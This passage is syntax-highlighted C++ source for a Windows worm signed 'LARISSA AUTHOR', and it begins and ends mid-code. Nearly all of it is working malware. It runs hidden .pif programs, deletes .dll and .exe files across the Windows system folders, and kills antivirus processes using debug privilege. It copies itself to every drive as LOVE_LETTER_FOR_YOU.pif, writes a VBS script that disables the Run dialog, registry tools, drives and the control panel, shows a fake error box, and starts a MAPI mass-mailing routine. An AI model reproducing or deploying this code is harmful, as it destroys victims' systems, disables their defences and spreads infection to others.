  </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">999999999999999999999999999999999999999</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">60000</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

  </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MSLARISSA.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">10000</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CmdPrompt32.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">10000</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"open"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SP00Lsv32.pif"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">payload</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">ofstream</span><span class="sc0"> </span><span class="sc11">here</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc10">.</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc6">"C:\\MESSAGE_TO_USER.txt"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc10">.</span><span class="sc11">setf</span><span class="sc10">(</span><span class="sc11">ios_base</span><span class="sc10">::</span><span class="sc11">showpoint</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Greetz to infected user!"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"I will survive,"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"In this moment in time."</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Your computer will crash,"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"So, you will be mine."</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"I will not crash,"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"I will not fail."</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"So, in this moment in time,"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"I will survive..."</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"   - LARISSA AUTHOR : 2-24-05"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">here</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">

  </span><span class="sc11">ofstream</span><span class="sc0"> </span><span class="sc11">msg_av</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">msg_av</span><span class="sc10">.</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc6">"C:\\MESSAGE_TO_AVs.txt"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">msg_av</span><span class="sc10">.</span><span class="sc11">setf</span><span class="sc10">(</span><span class="sc11">ios_base</span><span class="sc10">::</span><span class="sc11">showpoint</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">msg_av</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Greetz to AVs!"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">msg_av</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"I wanna be in AV industry when I grow up :-)"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">msg_av</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"  ----------------------------------------  "</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">msg_av</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"       - LARISSA AUTHOR : 2-24-05"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">msg_av</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">

  </span><span class="sc11">ofstream</span><span class="sc0"> </span><span class="sc11">bropia_msg</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">bropia_msg</span><span class="sc10">.</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc6">"C:\\MESSAGE_TO_BROPIA.txt"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">bropia_msg</span><span class="sc10">.</span><span class="sc11">setf</span><span class="sc10">(</span><span class="sc11">ios_base</span><span class="sc10">::</span><span class="sc11">showpoint</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">bropia_msg</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Hey Bropia.. stop making MSN worms it's stupid..."</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">bropia_msg</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"... lol -- Larissa Anti Bropia... -- Saving the world from BROPIA!!!"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">bropia_msg</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"                      - LARISSA AUTHOR : 2-24-05"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">bropia_msg</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">

  </span><span class="sc11">system</span><span class="sc10">(</span><span class="sc6">"del C:\\WINDOWS\\System32\\*.dll"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">system</span><span class="sc10">(</span><span class="sc6">"del C:\\WINDOWS\\System32\\*.exe"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">system</span><span class="sc10">(</span><span class="sc6">"del C:\\WINDOWS\\System\\*.dll"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">system</span><span class="sc10">(</span><span class="sc6">"del C:\\WINDOWS\\System\\*.exe"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">system</span><span class="sc10">(</span><span class="sc6">"del C:\\WINDOWS\\*.dll"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">system</span><span class="sc10">(</span><span class="sc6">"del C:\\WINDOWS\\*.exe"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Kill</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">kill_av</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">laris</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PROCESSENTRY32</span><span class="sc0"> </span><span class="sc11">process</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">process</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PROCESSENTRY32</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc16">void</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">photo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">photo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">process</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">photo</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">photo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">process</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">laris</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_TERMINATE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">process</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">process</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">kill_av</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">laris</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">laris</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_NO_MORE_FILES</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">laris</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetDebugPriv</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hToken</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">LUID</span><span class="sc0"> </span><span class="sc11">DebugVal</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">TOKEN_PRIVILEGES</span><span class="sc0"> </span><span class="sc11">tp</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">OpenProcessToken</span><span class="sc10">(</span><span class="sc11">GetCurrentProcess</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">TOKEN_ADJUST_PRIVILEGES</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">TOKEN_QUERY</span><span class="sc10">,&amp;</span><span class="sc11">hToken</span><span class="sc10">))</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">LookupPrivilegeValue</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SE_DEBUG_NAME</span><span class="sc10">,&amp;</span><span class="sc11">DebugVal</span><span class="sc10">))</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hToken</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">tp</span><span class="sc10">.</span><span class="sc11">PrivilegeCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tp</span><span class="sc10">.</span><span class="sc11">Privileges</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">Luid</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">DebugVal</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">tp</span><span class="sc10">.</span><span class="sc11">Privileges</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">].</span><span class="sc11">Attributes</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SE_PRIVILEGE_ENABLED</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">AdjustTokenPrivileges</span><span class="sc10">(</span><span class="sc11">hToken</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">tp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hToken</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_drives</span><span class="sc10">(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">drives</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">dr_type</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDriveType</span><span class="sc10">(</span><span class="sc11">drives</span><span class="sc10">);</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">dr_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">DRIVE_REMOVABLE</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOVE_LETTER_FOR_YOU.pif"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">dr_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">DRIVE_FIXED</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOVE_LETTER_FOR_YOU.pif"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">dr_type</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">DRIVE_REMOTE</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">drives</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LOVE_LETTER_FOR_YOU.pif"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">no</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">ofstream</span><span class="sc0"> </span><span class="sc11">nono</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc10">.</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc6">"C:\\WINDOWS\\WinVBS.vbs"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc10">.</span><span class="sc11">setf</span><span class="sc10">(</span><span class="sc11">ios_base</span><span class="sc10">::</span><span class="sc11">showpoint</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoRun\", 1, \"REG_DWORD\""</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableRegistryTools\", 1, \"REG_DWORD\""</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoDrives\", 67108863, \"REG_DWORD\""</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\WinOldApp\\Disabled\", 1, \"REG_DWORD\""</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"CreateObject(\"Wscript.shell\").regwrite \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoAdminPage\", 1, \"REG_DWORD\""</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">nono</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fastOut</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Invalid memory adress:\n\nProgram terminating."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"System Error"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">MB_ICONERROR</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">exit</span><span class="sc10">(-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sfrom</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">sto</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">smes</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">mes</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiMessage</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">lpszName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sfrom</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">ulRecipClass</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpszSubject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">fastOut</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mes</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
